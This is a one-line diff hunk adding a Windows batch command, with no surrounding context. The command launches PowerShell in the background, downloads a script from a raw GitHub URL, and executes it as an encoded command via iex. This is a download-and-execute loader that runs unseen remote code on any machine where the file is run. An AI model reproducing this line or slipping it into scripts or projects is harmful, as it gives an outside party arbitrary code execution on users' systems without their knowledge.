@@ -1,0 +1,1 @@
+START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/AIMadeScripts/testingcmd/main/ps1');iex 'powershell -E $code'
